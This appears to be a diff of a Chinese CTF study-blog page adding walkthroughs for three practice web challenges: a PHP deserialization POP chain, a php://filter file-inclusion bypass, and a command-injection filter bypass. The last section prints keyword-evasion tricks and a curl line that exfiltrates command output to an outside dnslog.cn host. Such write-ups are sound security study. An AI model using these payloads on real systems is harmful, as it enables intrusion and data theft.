@@ -30,7 +30,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
 <meta property="article:published_time" content="2025-04-24T09:07:05.000Z">
-<meta property="article:modified_time" content="2025-04-29T11:34:53.701Z">
+<meta property="article:modified_time" content="2025-07-04T09:38:49.376Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="train">
 <meta name="twitter:card" content="summary">
@@ -347,7 +347,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">15</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">16</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -396,8 +396,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-04-29 19:34:53</span>
-            <span class="mobile">2025-04-29 19:34:53</span>
+            <span class="desktop">2025-07-04 17:38:49</span>
+            <span class="mobile">2025-07-04 17:38:49</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -435,12 +435,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.6k Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2.2k Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>7 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>11 Mins</span>
         </span>
     
     
@@ -660,6 +660,73 @@
 <p>w22m析构函数，在w22m实例销毁的时候会输出w00m的属性</p>
 <p>w33m的string方法，如果w00m的属性是w33m实例，触发string方法，调用$this-&gt;w00m-&gt;{$this-&gt;w22m}();</p>
 <p>设置$this-&gt;w22m为‘Getflag’，$this-&gt;w00m为w44m实例，从而调用w44m::Getflag</p>
+<p>exp</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd = &#x27;08067&#x27;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w00m = $_GET[&#x27;w00m&#x27;];</span><br><span class="line">unserialize($w00m);</span><br><span class="line">$a= new w44m();</span><br><span class="line">$c= new w33m();</span><br><span class="line">$b= new w22m();</span><br><span class="line">$c-&gt;w00m = $a;</span><br><span class="line">$c-&gt;w22m = &#x27;Getflag&#x27;;</span><br><span class="line">$b-&gt;w00m= $c;</span><br><span class="line">#echo serialize($b);</span><br><span class="line">echo urlencode(serialize($b));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>倒推，要调用getflag可以看到在w33m中有</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;()；</span><br></pre></td></tr></table></figure></div>
+
+<p>可以令w00m为w44m，$this-&gt;w22m为getflag方法</p>
+<p>在w22m的 __destruct()来调用w33m的tostring方法</p>
+<h2 id="鹏城杯-2022-简单包含"><a href="#鹏城杯-2022-简单包含" class="headerlink" title="[鹏城杯 2022]简单包含"></a>[鹏城杯 2022]简单包含</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250704102640170.png"
+                      alt="image-20250704102640170"
+                ></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include($_POST[&quot;flag&quot;]);</span><br><span class="line">//flag in /var/www/html/flag.php;</span><br></pre></td></tr></table></figure></div>
+
+<p>post传参任意包含服务器的文件</p>
+<p>hint flag在&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php;里面</p>
+<p>php伪协议读取一下flag</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250704111646734.png"
+                      alt="image-20250704111646734"
+                ></p>
+<p>发现被过滤</p>
+<p>看一下index能不能读</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=php://filter/read=convert.base64-encode/resource=/var/www/html/index.php</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKCiRwYXRoID0gJF9QT1NUWyJmbGFnIl07CgppZiAoc3RybGVuKGZpbGVfZ2V0X2NvbnRlbnRzKCdwaHA6Ly9pbnB1dCcpKSA8IDgwMCAmJiBwcmVnX21hdGNoKCcvZmxhZy8nLCAkcGF0aCkpIHsKICAgIGVjaG8gJ25zc2N0ZiB3YWYhJzsKfSBlbHNlIHsKICAgIEBpbmNsdWRlKCRwYXRoKTsKfQo</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$path = $_POST[&quot;flag&quot;];</span><br><span class="line"></span><br><span class="line">if (strlen(file_get_contents(&#x27;php://input&#x27;)) &lt; 800 &amp;&amp; preg_match(&#x27;/flag/&#x27;, $path)) &#123;</span><br><span class="line">    echo &#x27;nssctf waf!&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    @include($path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>要求输入长度大于800，并且正则匹配过滤了flag，满足其一即可</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgPSdOU1NDVEZ7NGY4ZjcwMmEtMjAyNy00OWUxLWJkY2MtYjE3OTU4ZTUzNzY5fSc7Cg==</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php =&#x27;NSSCTF&#123;4f8f702a-2027-49e1-bdcc-b17958e53769&#125;&#x27;;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="SWPUCTF-2021-新生赛-finalrce"><a href="#SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="[SWPUCTF 2021 新生赛]finalrce"></a>[SWPUCTF 2021 新生赛]finalrce</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $url=$_GET[&#x27;url&#x27;];</span><br><span class="line">    if(preg_match(&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;,$url))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Sorry,you can&#x27;t use this.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Can you see anything?&quot;;</span><br><span class="line">        exec($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; Can you see anything?</span><br></pre></td></tr></table></figure></div>
+
+<p>命令执行过滤了</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;,$url))</span><br></pre></td></tr></table></figure></div>
+
+<p>过滤关键字的绕过</p>
+<p>首先我们知道关键字被过滤时可以使用以下绕过方式：</p>
+<p>如 ls 被过滤，可以替换为</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l&#x27;&#x27;s</span><br><span class="line"></span><br><span class="line">l\s </span><br></pre></td></tr></table></figure></div>
+
+<p>等等。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28584/?url=l\s%20/%20|tee%203.txt</span><br></pre></td></tr></table></figure></div>
+
+
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28584/?url=ca\t%20/flllll\aaaaaaggggggg|tee%203.txt</span><br></pre></td></tr></table></figure></div>
+
+<p>第二种方法dnslog数据外带</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl `l&#x27;&#x27;s`.xf3njn.dnslog.cn</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用反引号执行 ls 命令，执行的结果拼接到 xf3njn.dnslog.cn 域名上，然后访问，访问的日志可以在网站上看，就可以看到命令执行的结果。</span><br></pre></td></tr></table></figure></div>
+
+<p><code>ls</code> 执行的结果是 <code>index.php</code> 。</p>
+<p>这样的话我们直接查找根目录下包含 “f” 的文件：</p>
+<p>curl <code>ca\t /flllll\aaaaaaggggggg</code>.xf3njn.dnslog.cn</p>
 
 		</div>
 
@@ -674,7 +741,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-04-29 19:34:53
+                    :</strong> 2025-07-04 17:38:49
             </li>
         
         <li>
@@ -749,7 +816,7 @@
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
 		<div class="page-title">web从零开始day2</div>
-		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-ez-php"><span class="nav-text">[SWPUCTF 2022 新生赛]ez_ez_php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce"><span class="nav-text">[SWPUCTF 2021 新生赛]hardrce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-text">[SWPUCTF 2021 新生赛]error（报错注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easyupload3-0"><span class="nav-text">[SWPUCTF 2021 新生赛]easyupload3.0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF-2023-%E4%BD%9C%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="nav-text">[LitCTF 2023]作业管理系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-pop"><span class="nav-text">[SWPUCTF 2021 新生赛]pop</span></a></li></ol>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-ez-php"><span class="nav-text">[SWPUCTF 2022 新生赛]ez_ez_php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce"><span class="nav-text">[SWPUCTF 2021 新生赛]hardrce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-text">[SWPUCTF 2021 新生赛]error（报错注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easyupload3-0"><span class="nav-text">[SWPUCTF 2021 新生赛]easyupload3.0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF-2023-%E4%BD%9C%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="nav-text">[LitCTF 2023]作业管理系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-pop"><span class="nav-text">[SWPUCTF 2021 新生赛]pop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%B9%8F%E5%9F%8E%E6%9D%AF-2022-%E7%AE%80%E5%8D%95%E5%8C%85%E5%90%AB"><span class="nav-text">[鹏城杯 2022]简单包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-finalrce"><span class="nav-text">[SWPUCTF 2021 新生赛]finalrce</span></a></li></ol>
 
 	</div>
 </div>
@@ -778,11 +845,11 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        15 posts in total
+                        16 posts in total
                     </span>
                     
                         <span>
-                            25.5k words in total
+                            26.1k words in total
                         </span>
                     
                 </p>
